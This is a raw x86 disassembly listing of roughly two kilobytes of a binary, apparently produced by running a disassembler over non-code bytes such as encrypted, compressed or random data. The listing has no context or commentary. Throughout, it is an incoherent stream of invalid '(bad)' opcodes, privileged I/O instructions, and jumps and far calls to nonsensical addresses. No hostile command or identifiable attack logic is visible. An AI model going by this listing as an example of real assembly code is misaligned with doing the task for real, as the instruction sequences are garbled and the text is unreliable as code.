  40d54c:	cmp    esi,0x2a
  40d54f:	push   eax
  40d550:	fimul  WORD PTR [eax-0x17087a25]
  40d556:	and    al,0xf
  40d558:	aaa    
  40d559:	inc    esp
  40d55a:	lds    edx,FWORD PTR [ecx]
  40d55c:	and    eax,0xad93d1a9
  40d561:	xchg   BYTE PTR [eax-0x5779e0d2],bh
  40d567:	dec    ecx
  40d568:	push   eax
  40d569:	cmp    DWORD PTR [eax-0x5],ecx
  40d56c:	or     edi,DWORD PTR [edx-0x63]
  40d56f:	inc    DWORD PTR [esi]
  40d571:	or     eax,0xe1f98221
  40d576:	jmp    0x4f998982
  40d57b:	(bad)  
  40d57c:	outs   dx,DWORD PTR ds:[esi]
  40d57d:	inc    ebx
  40d57e:	rol    DWORD PTR [ebx-0x2aed5660],cl
  40d584:	mov    eax,0x1ca4fdb
  40d589:	inc    ebp
  40d58a:	push   cs
  40d58b:	dec    ebp
  40d58c:	mov    al,dh
  40d58e:	cmp    edx,edi
  40d590:	mov    al,ds:0xb4e29e58
  40d595:	pop    ebp
  40d596:	repz loopne 0x40d590
  40d599:	ret    0x76fe
  40d59c:	(bad)  
  40d59e:	(bad)  
  40d59f:	(bad)  
  40d5a0:	leave  
  40d5a1:	leave  
  40d5a2:	ror    DWORD PTR [esi+0x17b39b02],1
  40d5a8:	xchg   edi,eax
  40d5a9:	imul   esi,DWORD PTR [eax],0x57
  40d5ac:	push   ds
  40d5ad:	mov    ebx,0x86c00389
  40d5b2:	ror    DWORD PTR [edx+esi*8-0x4ca87f83],cl
  40d5b9:	cmp    al,0x9a
  40d5bb:	outs   dx,BYTE PTR ds:[esi]
  40d5bc:	ficom  WORD PTR [eax-0x5e]
  40d5bf:	add    BYTE PTR [edx+edi*1+0x486f4615],ah
  40d5c6:	dec    edi
  40d5c7:	icebp  
  40d5c8:	sbb    eax,0x10fdede0
  40d5cd:	xor    al,BYTE PTR [edx]
  40d5cf:	cli    
  40d5d0:	test   eax,0xc9229a76
  40d5d5:	jmp    0xcfefcad
  40d5da:	sbb    edx,edx
  40d5dc:	mov    dl,0xb0
  40d5de:	nop
  40d5df:	push   0xffffffc8
  40d5e1:	or     al,0x68
  40d5e3:	mov    ebx,0xe9a30470
  40d5e8:	and    cl,cl
  40d5ea:	rcl    DWORD PTR [edx-0x37],0x46
  40d5ee:	xchg   ebx,eax
  40d5ef:	pop    ebp
  40d5f0:	dec    esi
  40d5f1:	jbe    0x40d5bf
  40d5f3:	mov    ebx,0xb22a7880
  40d5f8:	push   ecx
  40d5f9:	(bad)  
  40d5fa:	addr16 shl esi,0x6a
  40d5fe:	(bad)  
  40d5ff:	aam    0x66
  40d601:	sbb    edx,ebp
  40d603:	adc    BYTE PTR [eax],0x84
  40d606:	loope  0x40d5c2
  40d608:	lods   al,BYTE PTR ds:[esi]
  40d609:	scas   eax,DWORD PTR es:[edi]
  40d60a:	ds retf 0xf2c1
  40d60e:	adc    bh,BYTE PTR [eax]
  40d610:	fdivr  DWORD PTR [edi+esi*8-0x5d80b3f4]
  40d617:	sbb    DWORD PTR [edx],0x716c0f45
  40d61d:	sub    eax,0x96f7a66e
  40d622:	mov    al,ds:0xc6d4cc41
  40d627:	xchg   BYTE PTR [edi-0xcbe6d31],dl
  40d62d:	and    DWORD PTR ds:0xe3078036,esi
  40d633:	test   BYTE PTR ds:0x9f10c8ab,dl
  40d639:	lods   eax,DWORD PTR ds:[esi]
  40d63a:	daa    
  40d63b:	cmp    ch,al
  40d63d:	xchg   ecx,eax
  40d63e:	mov    dh,0x6f
  40d640:	adc    BYTE PTR [ebx+0x2],0x66
  40d644:	or     eax,0x2fcb5426
  40d649:	mov    cl,0x93
  40d64b:	aam    0x1c
  40d64d:	in     eax,0xf2
  40d64f:	pop    edx
  40d650:	and    eax,0x27c2bc26
  40d655:	mov    dl,0x2e
  40d657:	inc    ebx
  40d658:	sbb    al,0xd0
  40d65a:	or     esp,DWORD PTR [eax-0x20]
  40d65d:	dec    ebp
  40d65e:	icebp  
  40d65f:	xor    BYTE PTR [esi],dh
  40d661:	enter  0x368d,0x35
  40d665:	retf   
  40d666:	cwde   
  40d667:	addr16 pop ss
  40d669:	mov    bl,0x49
  40d66b:	retf   
  40d66c:	jns    0x40d659
  40d66e:	ret    0xfbf1
  40d671:	cmp    bx,WORD PTR [ecx]
  40d674:	dec    ebx
  40d675:	sbb    ebx,ebx
  40d677:	mov    ds:0xcb431958,al
  40d67c:	or     al,0x9
  40d67e:	fist   DWORD PTR [eax+ebp*2-0x68]
  40d682:	adc    al,0x6c
  40d684:	clc    
  40d685:	popa   
  40d686:	jo     0x40d646
  40d688:	loope  0x40d693
  40d68a:	mov    ds:0x7d6da947,al
  40d68f:	(bad)  
  40d690:	cmp    bl,ah
  40d692:	mov    dl,0xa5
  40d694:	faddp  st(4),st
  40d696:	push   cs
  40d697:	in     al,0x3
  40d699:	jnp    0x40d6fe
  40d69b:	dec    eax
  40d69c:	ds ds sub al,dh
  40d6a0:	pop    eax
  40d6a1:	les    eax,FWORD PTR [edx+0x4a]
  40d6a4:	jne    0x40d6cf
  40d6a6:	mov    ecx,0x96f16362
  40d6ab:	or     DWORD PTR [si],esi
  40d6ae:	sub    al,0xb3
  40d6b0:	and    ebx,DWORD PTR [ecx+edi*8]
  40d6b3:	mov    ebp,0xed29d756
  40d6b8:	push   eax
  40d6b9:	xchg   edi,eax
  40d6ba:	scas   eax,DWORD PTR es:[edi]
  40d6bb:	push   0x3d
  40d6bd:	daa    
  40d6be:	pop    esi
  40d6bf:	mov    eax,ds:0x3b9c2ee3
  40d6c4:	mov    ds:0x1147e4a9,eax
  40d6c9:	push   esi
  40d6ca:	dec    eax
  40d6cb:	nop
  40d6cc:	adc    cl,BYTE PTR [ecx]
  40d6ce:	shl    BYTE PTR [ebx-0x48],1
  40d6d1:	xor    esp,esp
  40d6d3:	loope  0x40d747
  40d6d5:	jg     0x40d66e
  40d6d7:	adc    dl,BYTE PTR [edx]
  40d6d9:	and    DWORD PTR [ebp-0x1d],edi
  40d6dc:	sti    
  40d6dd:	xor    ecx,esp
  40d6df:	cdq    
  40d6e0:	and    al,0xb2
  40d6e2:	mov    ebp,0x516e0c35
  40d6e7:	ja     0x40d6d2
  40d6e9:	sbb    DWORD PTR [ecx+ebx*8],0xffffffe7
  40d6ed:	inc    esi
  40d6ee:	idiv   DWORD PTR [ebx]
  40d6f0:	outs   dx,BYTE PTR ds:[esi]
  40d6f1:	cs je  0x40d714
  40d6f4:	push   ebx
  40d6f5:	es retf 
  40d6f7:	sbb    dh,BYTE PTR [edx-0x63ed7e08]
  40d6fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6ff:	fsubr  st,st(3)
  40d701:	ds (bad) 
  40d703:	in     eax,dx
  40d704:	popf   
  40d705:	sar    DWORD PTR [eax-0x7f],1
  40d708:	xchg   DWORD PTR [edi+ebp*1],esp
  40d70b:	fsub   st,st(6)
  40d70d:	jbe    0x40d778
  40d70f:	(bad)  
  40d710:	jb     0x40d719
  40d712:	and    eax,esp
  40d714:	cmp    DWORD PTR [ecx-0x3c95f41],0x18aaa7d8
  40d71e:	and    eax,0xa2fecfeb
  40d723:	out    dx,eax
  40d724:	dec    ecx
  40d725:	icebp  
  40d726:	mov    WORD PTR [esi+edx*4+0x7f0185da],ss
  40d72d:	cmp    DWORD PTR [ecx-0x60],esp
  40d730:	test   DWORD PTR [ebx+esi*8],0x63ae3519
  40d737:	(bad)
  40d73c:	(bad)  
  40d73e:	jno    0x40d6cd
  40d740:	mov    ebp,0xcc9a0cbc
  40d745:	pop    esi
  40d746:	js     0x40d720
  40d748:	ins    DWORD PTR es:[edi],dx
  40d749:	aam    0xad
  40d74b:	pushw  es
  40d74d:	test   BYTE PTR [ecx-0x2b086a07],0xd9
  40d754:	stc    
  40d755:	and    eax,0x2c2320e3
  40d75a:	scas   al,BYTE PTR es:[edi]
  40d75b:	inc    esp
  40d75c:	jl     0x40d798
  40d75e:	xor    eax,0x9a3649b5
  40d763:	adc    cl,bh
  40d765:	fucomi st,st(6)
  40d767:	or     DWORD PTR [eax+0x54a9a651],edx
  40d76d:	jge    0x40d747
  40d76f:	retf   0xbee1
  40d772:	stos   DWORD PTR es:[edi],eax
  40d773:	clc    
  40d774:	aas    
  40d775:	xor    eax,0x350c2901
  40d77a:	ss pop ebp
  40d77c:	push   edx
  40d77d:	pop    ebx
  40d77e:	jb     0x40d750
  40d780:	and    ebp,DWORD PTR [esi]
  40d782:	in     eax,dx
  40d783:	cwde   
  40d784:	cmp    dl,bh
  40d786:	test   BYTE PTR [esp+ecx*1],dh
  40d789:	push   ebx
  40d78a:	(bad)  
  40d78b:	xor    BYTE PTR [edx-0x1d992d36],0x35
  40d792:	dec    edi
  40d793:	jmp    0x40d787
  40d795:	icebp  
  40d796:	imul   esi,ebp,0x49
  40d799:	cmp    al,0xa0
  40d79b:	sar    BYTE PTR [edi+0x60],0xc0
  40d79f:	mul    DWORD PTR [ebx]
  40d7a1:	fild   WORD PTR [edx+0x768dbb77]
  40d7a7:	mov    ebp,0xcb7c7047
  40d7ac:	int    0xe7
  40d7ae:	fisub  WORD PTR [ebx-0x2]
  40d7b1:	sar    BYTE PTR [esi-0x6608f455],0xff
  40d7b8:	dec    ebx
  40d7b9:	inc    edx
  40d7ba:	ret    
  40d7bb:	pop    edi
  40d7bc:	fbstp  TBYTE PTR [ebx+0x13]
  40d7bf:	mov    ch,0xee
  40d7c1:	dec    edi
  40d7c2:	sbb    eax,0x5d82a864
  40d7c7:	mul    DWORD PTR [ecx+0x47]
  40d7ca:	sbb    BYTE PTR [eax+0x424ac1a2],0xb8
  40d7d1:	mov    al,ds:0xfaae7e68
  40d7d6:	sbb    al,0x0
  40d7d8:	outs   dx,DWORD PTR ds:[esi]
  40d7d9:	loope  0x40d846
  40d7db:	std    
  40d7dc:	mov    ds:0xd6142847,eax
  40d7e1:	es and al,ch
  40d7e4:	inc    edi
  40d7e5:	push   0x29
  40d7e7:	into   
  40d7e8:	adc    al,0x9b
  40d7ea:	adc    al,0x75
  40d7ec:	jns    0x40d812
  40d7ee:	jmp    0x7390f55a
  40d7f3:	repz xchg sp,ax
  40d7f6:	fmul   QWORD PTR [eax+0x19]
  40d7f9:	xchg   edx,eax
  40d7fa:	or     cl,0x12
  40d7fd:	and    edi,eax
  40d7ff:	mov    esi,0xcab3fe65
  40d804:	ret    
  40d805:	inc    ebp
  40d806:	pop    esi
  40d807:	cmp    BYTE PTR [ebp-0x3],bl
  40d80a:	cmc    
  40d80b:	leave  
  40d80c:	and    eax,0x7f5c4fe8
  40d811:	inc    ebx
  40d812:	mov    esp,0x8188a7e7
  40d817:	stos   BYTE PTR es:[edi],al
  40d818:	xor    dl,dl
  40d81a:	arpl   WORD PTR [edi-0x6f6a4f06],di
  40d820:	adc    bl,BYTE PTR gs:[esi]
  40d823:	jo     0x40d85f
  40d825:	push   ebx
  40d826:	sbb    dh,dh
  40d828:	pop    ds
  40d829:	sub    DWORD PTR ds:0xa6db9744,0xb96492c
  40d833:	fcomp  QWORD PTR [ebx+0x6ef54273]
  40d839:	jecxz  0x40d817
  40d83b:	fimul  DWORD PTR [eax+0x7]
  40d83e:	sub    eax,0x9d251d6f
  40d843:	mov    ss,WORD PTR [ebx-0x788cb471]
  40d849:	dec    eax
  40d84a:	dec    edi
  40d84b:	ins    DWORD PTR es:[edi],dx
  40d84c:	adc    al,0x3e
  40d84e:	mov    al,0xfb
  40d850:	arpl   WORD PTR [eax-0x930f760],bx
  40d856:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d857:	dec    esp
  40d858:	repz adc edi,0x53d0b165
  40d85f:	inc    ebp
  40d860:	jl     0x40d865
  40d862:	daa    
  40d863:	xor    al,0x3e
  40d865:	hlt    
  40d866:	adc    ah,BYTE PTR [eax]
  40d868:	fxch   st(4)
  40d86a:	out    dx,al
  40d86b:	rcl    BYTE PTR [edx],1
  40d86d:	add    al,0x4
  40d86f:	cmc    
  40d870:	xor    ah,BYTE PTR [eax-0x5]
  40d873:	and    DWORD PTR [edx],ebx
  40d875:	pop    ds
  40d876:	push   es
  40d877:	push   ecx
  40d878:	imul   esp,DWORD PTR [ecx],0x1e
  40d87b:	loope  0x40d84e
  40d87d:	mov    esp,esi
  40d87f:	xchg   BYTE PTR [ebp+0x11],bh
  40d882:	sbb    esp,DWORD PTR [ecx-0xc]
  40d885:	sub    BYTE PTR [ecx+0x361cd191],ch
  40d88b:	inc    esi
  40d88c:	mov    al,0x3e
  40d88e:	retf   0x8980
  40d891:	and    BYTE PTR [eax-0x309ded01],0xa0
  40d898:	mov    esp,0x5d557ab
  40d89d:	mov    bl,0xa1
  40d89f:	xchg   ebp,eax
  40d8a0:	jb     0x40d8fa
  40d8a2:	adc    ecx,ebp
  40d8a4:	dec    ebp
  40d8a5:	data16 arpl dx,bp
  40d8a8:	inc    esp
  40d8a9:	xchg   BYTE PTR [edi+0x36],dl
  40d8ac:	mov    WORD PTR [ebx+0x3bb4ff3d],fs
  40d8b2:	cmp    esi,DWORD PTR [esi]
  40d8b4:	sahf   
  40d8b5:	pushf  
  40d8b6:	add    ebp,DWORD PTR [eax+0x579b216d]
  40d8bc:	adc    DWORD PTR [edx],0xfd166566
  40d8c2:	pop    esp
  40d8c3:	xchg   eax,edx
  40d8c5:	je     0x40d8c5
  40d8c7:	shr    esi,0xfc
  40d8ca:	and    DWORD PTR [esp+ecx*4+0x2f5c56c9],edx
  40d8d1:	jg     0x40d860
  40d8d3:	jmp    0x40d866
  40d8d5:	xor    ch,ah
  40d8d7:	scas   al,BYTE PTR es:[edi]
  40d8d8:	pop    ds
  40d8d9:	xchg   edi,eax
  40d8da:	popa   
  40d8db:	mov    ds:0x6d05a2c5,al
  40d8e0:	push   0x46e7932e
  40d8e5:	mov    bl,0x3f
  40d8e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8e8:	imul   esp,DWORD PTR [edi-0x5e],0x65
  40d8ec:	fcomp  QWORD PTR ds:0x4021a189
  40d8f2:	add    DWORD PTR [edx],0xffffffe7
  40d8f5:	imul   edi,DWORD PTR [ebx-0x1b5ae00d],0xfffffff3
  40d8fc:	idiv   BYTE PTR [edi]
  40d8fe:	shl    DWORD PTR [ecx+edi*2],0xa4
  40d902:	loope  0x40d8a4
  40d904:	fisttp QWORD PTR [ebp-0x65a854cb]
  40d90a:	imul   esp,DWORD PTR [edx-0x6d9b44d9],0x49f0b7
  40d914:	dec    ebp
  40d915:	cwde   
  40d916:	dec    edi
  40d917:	scas   al,BYTE PTR es:[edi]
  40d918:	pop    edi
  40d919:	xchg   esp,eax
  40d91a:	(bad)  
  40d91b:	in     eax,0x72
  40d91d:	xor    ch,dh
  40d91f:	daa    
  40d920:	mov    ch,0xfa
  40d922:	clc    
  40d923:	lods   al,BYTE PTR ds:[esi]
  40d924:	and    ebp,DWORD PTR [ebx+0x45]
  40d927:	jl     0x40d8e4
  40d929:	cwde   
  40d92a:	jl     0x40d8b5
  40d92c:	dec    edx
  40d92d:	inc    ebx
  40d92e:	pusha  
  40d92f:	je     0x40d8b2
  40d931:	and    ebp,DWORD PTR [ebx-0xc]
  40d934:	mov    cl,BYTE PTR [ecx]
  40d936:	test   ecx,ebp
  40d938:	jmp    0x971c:0x57d9dcaa
  40d93f:	out    dx,eax
  40d940:	sbb    al,0x2
  40d942:	scas   al,BYTE PTR es:[edi]
  40d943:	call   0xf88c:0x7d69a8dc
  40d94a:	cmp    eax,0x185ad6be
  40d94f:	dec    esp
  40d950:	cmp    DWORD PTR [ebx-0x40f2863b],esp
  40d956:	repz repz mov eax,ds:0xef6b27c2
  40d95d:	jge    0x40d925
  40d95f:	out    dx,al
  40d960:	inc    ebp
  40d961:	cmc    
  40d962:	add    esp,DWORD PTR [ebx+0x389f13d1]
  40d968:	jnp    0x40d961
  40d96a:	call   0xa80368b
  40d96f:	jae    0x40d9cc
  40d971:	dec    edx
  40d972:	dec    ebx
  40d973:	bound  ebp,QWORD PTR [esp+0x10]
  40d977:	jbe    0x40d940
  40d979:	push   ebx
  40d97a:	mov    fs,ebx
  40d97c:	mov    eax,ss
  40d97e:	and    esi,ebx
  40d980:	ins    BYTE PTR es:[edi],dx
  40d981:	dec    eax
  40d982:	outs   dx,DWORD PTR ds:[esi]
  40d983:	mov    WORD PTR [eax],es
  40d985:	add    eax,0x45aa7760
  40d98a:	jnp    0x40d9f3
  40d98c:	cmp    al,BYTE PTR [esp+edi*2]
  40d98f:	leave  
  40d990:	es mov eax,0x2e28919d
  40d996:	add    DWORD PTR ss:[edi-0x2c090f36],edx
  40d99d:	jl     0x40d942
  40d99f:	daa    
  40d9a0:	pop    ds
  40d9a1:	rcl    DWORD PTR [ebp-0x33864c2f],cl
  40d9a7:	ins    BYTE PTR es:[edi],dx
  40d9a8:	adc    DWORD PTR [edi],edi
  40d9aa:	mov    dh,BYTE PTR [eax+0x697fe2d8]
  40d9b0:	repnz pop edx
  40d9b2:	jo     0x40da23
  40d9b4:	mov    bh,0x19
  40d9b6:	or     bh,BYTE PTR [eax+0x69211981]
  40d9bc:	(bad)  
  40d9bd:	and    edx,DWORD PTR [eax+0x54d1b4f2]
  40d9c3:	pop    esp
  40d9c4:	retf   0xcdf5
  40d9c7:	pop    ds
  40d9c8:	cwde   
  40d9c9:	call   0x86fbb643
  40d9ce:	shl    BYTE PTR [ebx-0x446572de],cl
  40d9d4:	ja     0x40d9ac
  40d9d6:	inc    edx
  40d9d7:	adc    cl,ah
  40d9d9:	mov    bh,0xb7
  40d9db:	aam    0xa2
  40d9dd:	sar    DWORD PTR [ecx-0x4a],1
  40d9e0:	xor    eax,0xb2ff16ca
  40d9e5:	jb     0x40d99e
  40d9e7:	push   0x72006afc
  40d9ec:	imul   edi,DWORD PTR [esi],0xffffff9c
  40d9ef:	sahf   
  40d9f0:	jmp    edi
  40d9f2:	jnp    0x40d977
  40d9f4:	loop   0x40d9b2
  40d9f6:	into   
  40d9f7:	add    eax,0x8c33024
  40d9fc:	pop    eax
  40d9fd:	cld    
  40d9fe:	int3   
  40d9ff:	lea    edx,[edi+0x6ba150ab]
  40da05:	jg     0x40d988
  40da07:	test   al,0x37
  40da09:	mov    eax,0x2851283a
  40da0e:	outs   dx,DWORD PTR ds:[esi]
  40da0f:	xchg   BYTE PTR [ebx-0x107aed05],dl
  40da15:	call   0x8932:0xf7c54085
  40da1c:	mov    esi,edi
  40da1e:	int3   
  40da1f:	stc    
  40da20:	sbb    esi,esp
  40da22:	jbe    0x40da33
  40da24:	xchg   DWORD PTR [edx-0x4a392eff],ebp
  40da2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da2b:	pop    es
  40da2c:	cmp    ebx,DWORD PTR [edi+eiz*2-0x27]
  40da30:	enter  0x7234,0x33
  40da34:	mov    bl,0xb7
  40da36:	fsub   st(2),st
  40da38:	stos   DWORD PTR es:[edi],eax
  40da39:	(bad)  
  40da3a:	mov    ebx,0x22b618ad
  40da3f:	mov    ah,0x31
  40da41:	fsubp  st(0),st
  40da43:	push   esp
  40da44:	jns    0x40d9ec
  40da46:	cli    
  40da47:	rcr    BYTE PTR [edi+0x7a],0x7d
  40da4b:	xchg   esi,eax
  40da4c:	or     BYTE PTR [ebx],ah
  40da4e:	pusha  
  40da4f:	and    edx,DWORD PTR [ebx+edx*8]
  40da52:	inc    ebx
  40da53:	cmp    al,0x22
  40da55:	sub    DWORD PTR [ebx+ecx*1+0x66465ac8],edi
  40da5c:	(bad)  
  40da5d:	mov    esp,0x1cdccab6
  40da62:	scas   al,BYTE PTR es:[edi]
  40da63:	mov    ds:0x46604031,eax
  40da68:	mov    dh,0x72
  40da6a:	add    ebp,ebp
  40da6c:	inc    esp
  40da6d:	jg     0x40daa1
  40da6f:	sub    al,0x51
  40da71:	stos   BYTE PTR es:[edi],al
  40da72:	push   edi
  40da73:	mov    ebp,0x95441a2
  40da78:	leave  
  40da79:	aaa    
  40da7a:	es sbb esi,esi
  40da7d:	fld    QWORD PTR ds:0x508c7a2e
  40da83:	imul   ecx,DWORD PTR [edx],0xe64bf472
  40da89:	neg    DWORD PTR [ecx+0x16]
  40da8c:	sar    DWORD PTR [ecx],0xb2
  40da8f:	jb     0x40da9e
  40da91:	adc    ebx,DWORD PTR [edx+0x586972]
  40da97:	into   
  40da98:	mov    ss,WORD PTR [eax]
  40da9a:	stc    
  40da9b:	arpl   cx,di
  40da9d:	repz (bad) 
  40da9f:	clc    
  40daa0:	or     eax,0xb3f3ec4a
  40daa5:	inc    eax
  40daa6:	dec    edi
  40daa7:	and    eax,0xde552714
  40daac:	jle    0x40da53
  40daae:	cmp    al,0xf0
  40dab0:	mov    esi,0x92dd9e63
  40dab5:	xchg   ebp,eax
  40dab6:	aas    
  40dab7:	mov    ds:0xfed7a3f3,al
  40dabc:	dec    ecx
  40dabd:	push   ecx
  40dabe:	enter  0xd503,0x2f
  40dac2:	ret    0x8257
  40dac5:	(bad)  
  40dac6:	mov    dh,0x60
  40dac8:	xor    al,0xcd
  40daca:	in     eax,0x35
  40dacc:	xchg   BYTE PTR [ebx+0x5f],dh
  40dacf:	add    eax,0x5b9fe449
  40dad4:	mov    ebp,?
  40dad6:	in     al,dx
  40dad7:	cmp    eax,0x42f651c2
  40dadc:	sub    DWORD PTR [edx+0x410991a5],ebp
  40dae2:	cmp    ebp,ebp
  40dae4:	pop    edx
  40dae5:	call   0x62ac:0x62f9ceb9
  40daec:	or     bl,BYTE PTR [edi-0x4bf2c0fe]
  40daf2:	popa   
  40daf3:	loope  0x40db04
  40daf5:	xchg   edx,eax
  40daf6:	jbe    0x40dad7
  40daf8:	popa   
  40daf9:	lods   al,BYTE PTR ds:[esi]
  40dafa:	push   esp
  40dafb:	idiv   BYTE PTR [ebp+edx*8+0x77]
  40daff:	imul   ecx,DWORD PTR [ecx-0x38],0x5a13ac5f
  40db06:	jne    0x40dad3
  40db08:	mov    DWORD PTR [ebp+0x30a45c4c],edx
  40db0e:	jmp    0x40db72
  40db10:	fld    QWORD PTR [ebx+0x55]
  40db13:	mov    DWORD PTR [ecx+0x72c22fe5],ebp
  40db19:	sub    BYTE PTR [esi+0x55abfe6a],0x72
  40db20:	mov    dl,al
  40db22:	pushf  
  40db23:	push   esi
  40db24:	sbb    eax,0x8b8a2b62
  40db29:	or     ch,al
  40db2b:	mov    esi,0x8981ebc9
  40db30:	imul   esi
  40db32:	add    ah,ah
  40db34:	adc    DWORD PTR [edi],esp
  40db36:	sub    DWORD PTR [ebx-0x41d5b19c],esp
  40db3c:	push   ebx
  40db3d:	int3   
  40db3e:	lods   al,BYTE PTR ds:[esi]
  40db3f:	sbb    ch,bh
  40db41:	outs   dx,BYTE PTR ds:[esi]
  40db42:	cmp    ch,BYTE PTR [esi+edx*4+0x390588e6]
  40db49:	popf   
  40db4a:	sub    esi,DWORD PTR [eax+0x539a2b5f]
  40db50:	or     DWORD PTR [edx+ecx*1+0x31],ebp
  40db54:	jp     0x40db01
  40db56:	int    0x47
  40db58:	icebp  
  40db59:	pop    edi
  40db5a:	iret   
  40db5b:	xchg   eax,edx
  40db5d:	xchg   edi,eax
  40db5e:	icebp  
  40db5f:	push   ss
  40db60:	bswap  ebx
  40db62:	sbb    ch,BYTE PTR [eax*4-0x70b67fed]
  40db69:	ret    0x5810
  40db6c:	shl    DWORD PTR [ecx-0x3d83e8be],1
  40db72:	sbb    BYTE PTR [ecx+0x30],dh
  40db75:	inc    edi
  40db76:	popf   
  40db77:	add    al,0x2d
  40db7a:	mov    cl,0xd0
  40db7c:	push   ss
  40db7d:	mov    DWORD PTR [esi],esi
  40db7f:	mov    BYTE PTR [esi+0x43],ah
  40db82:	and    cl,BYTE PTR [eax-0x1a]
  40db85:	sub    eax,0x5bf63fba
  40db8a:	(bad)  
  40db8b:	push   ss
  40db8c:	adc    al,0x3b
  40db8e:	cmp    bh,BYTE PTR [edx+ebp*8]
  40db91:	ins    BYTE PTR es:[edi],dx
  40db92:	pusha  
  40db93:	mov    ch,0x39
  40db95:	mov    ecx,0xc6079e9c
  40db9a:	and    esi,edx
  40db9c:	sbb    ecx,DWORD PTR [ecx+ebx*8]
  40db9f:	mov    al,ds:0x616603a4
  40dba4:	push   ss
  40dba5:	xchg   edx,eax
  40dba6:	jns    0x40dbc3
  40dba8:	bound  eax,QWORD PTR [esp+ebp*4+0x33]
  40dbac:	jl     0x40db51
  40dbae:	in     al,0xb7
  40dbb0:	ja     0x40dc20
  40dbb2:	cld    
  40dbb3:	pop    edi
  40dbb4:	imul   ebx,DWORD PTR [edi+esi*8],0xdb124a27
  40dbbb:	repz repz test DWORD PTR [edx],0x640113ac
  40dbc3:	push   cs
  40dbc4:	hlt    
  40dbc5:	sub    esi,DWORD PTR [esi+0x54]
  40dbc8:	and    ah,BYTE PTR [edi-0x3f9eb7e3]
  40dbce:	les    eax,FWORD PTR [ecx]
  40dbd0:	shl    ebp,0x70
  40dbd3:	xchg   DWORD PTR [edx+0x20021568],edx
  40dbd9:	mov    cl,0x20
  40dbdb:	sub    DWORD PTR [ecx-0x7c],edi
  40dbde:	xor    BYTE PTR [ecx-0x29],dl
  40dbe1:	jmp    0x40db73
  40dbe3:	push   ebp
  40dbe4:	pushf  
  40dbe5:	mov    edx,DWORD PTR [eax+0x5521213c]
  40dbeb:	fild   QWORD PTR [edx-0x5a]
  40dbee:	sbb    edi,DWORD PTR [esi]
  40dbf0:	pop    ss
  40dbf1:	pop    ds
  40dbf2:	aam    0xfc
  40dbf4:	add    al,0xfb
  40dbf6:	cmp    BYTE PTR [edi+0x6d],bl
  40dbf9:	ds idiv esp
  40dbfc:	mov    bl,0xb9
  40dbfe:	adc    eax,0x449105ef
  40dc03:	mov    dh,0x73
  40dc05:	mov    ecx,0x9ff63812
  40dc0a:	bsr    edx,ebx
  40dc0d:	xchg   esi,eax
  40dc0e:	inc    ecx
  40dc0f:	mov    eax,0xad9c8f54
  40dc14:	outs   dx,BYTE PTR ds:[esi]
  40dc15:	mov    eax,ds:0x7c5a1013
  40dc1a:	add    esi,DWORD PTR [edi]
  40dc1c:	push   eax
  40dc1d:	adc    ah,BYTE PTR [edi+0x14f0671c]
  40dc23:	mov    al,ds:0x28accaf7
  40dc28:	retf   
  40dc29:	in     eax,dx
  40dc2a:	push   ebp
  40dc2b:	popf   
  40dc2c:	fldenv [esi-0x78]
  40dc30:	and    BYTE PTR [ebx+0x32],dh
  40dc33:	jns    0x40dc99
  40dc35:	add    DWORD PTR [edi+0x6737560],esp
  40dc3b:	or     BYTE PTR [esi],al
  40dc3d:	inc    DWORD PTR [ebp-0x6d1c0437]
  40dc43:	ds push cx
  40dc46:	xor    DWORD PTR [edx+0x7b],edx
  40dc49:	stc    
  40dc4a:	imul   ebp,DWORD PTR [ebp+0x7eb33e49],0xe942ad93
  40dc54:	mov    dh,0xfb
  40dc56:	pop    ebp
  40dc57:	loop   0x40dc5d
  40dc59:	mov    dl,0xb
  40dc5b:	mov    edx,DWORD PTR [ecx+0x18]
  40dc5e:	shl    BYTE PTR [ecx],1
  40dc60:	adc    al,0x22
  40dc62:	kandnw k0,k3,k5
  40dc66:	inc    ebx
  40dc67:	mov    BYTE PTR [esi-0x5edeec19],cl
  40dc6d:	jbe    0x40dcc8
  40dc6f:	out    0x77,eax
  40dc71:	mov    ds:0x7c62a9e,al
  40dc76:	lds    edx,FWORD PTR [ebx-0x1334548a]
  40dc7c:	repz mov bh,0xc5
  40dc7f:	mov    WORD PTR [ecx-0x6abfab69],?
  40dc85:	and    al,0xfe
  40dc87:	ret    
  40dc88:	or     BYTE PTR [eax+0x271e24b3],dl
  40dc8e:	shl    DWORD PTR [ecx-0x31],1
  40dc91:	in     eax,dx
  40dc92:	lea    eax,[esi+0x7621614c]
  40dc98:	push   ebp
  40dc99:	in     al,0x30
  40dc9b:	and    DWORD PTR [ebx+0x31b145e3],esi
  40dca1:	or     al,0x68
  40dca3:	shl    dl,0xba
  40dca6:	scas   al,BYTE PTR es:[edi]
  40dca7:	mov    eax,0x24ba3fd1
  40dcac:	cmp    BYTE PTR [esi],0x22
  40dcaf:	retf   
  40dcb0:	and    DWORD PTR [ebx+eiz*8],ecx
  40dcb3:	(bad)  
  40dcb4:	repnz add edx,DWORD PTR [bx+di]
  40dcb8:	sbb    bl,BYTE PTR [ecx]
  40dcba:	loopne 0x40dd34
  40dcbc:	xchg   edi,eax
  40dcbd:	mov    edx,eax
  40dcbf:	pop    ecx
  40dcc0:	in     al,0xfe
  40dcc2:	jns    0x40dc69
  40dcc4:	xor    eax,0x130c77c0
  40dcc9:	cmp    DWORD PTR [ecx+0x39df1e4],edx
  40dccf:	xchg   esi,eax
  40dcd0:	xchg   edi,eax
  40dcd1:	int3   
  40dcd2:	dec    esi
  40dcd3:	ins    DWORD PTR es:[edi],dx
  40dcd4:	sahf   
  40dcd5:	inc    eax
  40dcd6:	(bad)  
  40dcd7:	repnz pop esi
  40dcd9:	or     edx,0x64
  40dcdc:	test   edi,ebp
  40dcde:	cli    
  40dcdf:	loopne 0x40dc62
  40dce1:	js     0x40dd31
  40dce3:	jle    0x40dc91
  40dce5:	mov    ah,0xb8
  40dce7:	icebp  
  40dce8:	push   0xffffffbd
  40dcea:	ss jns 0x40dcb3
  40dced:	pushw  es
  40dcef:	or     cl,dl
  40dcf1:	jno    0x40dc74
  40dcf3:	sbb    al,0xfa
  40dcf5:	add    BYTE PTR ds:0x5d1d2b29,0xd7
  40dcfc:	(bad)  
  40dcfd:	lods   al,BYTE PTR ds:[esi]
  40dcfe:	inc    esp
  40dcff:	sbb    eax,ebp
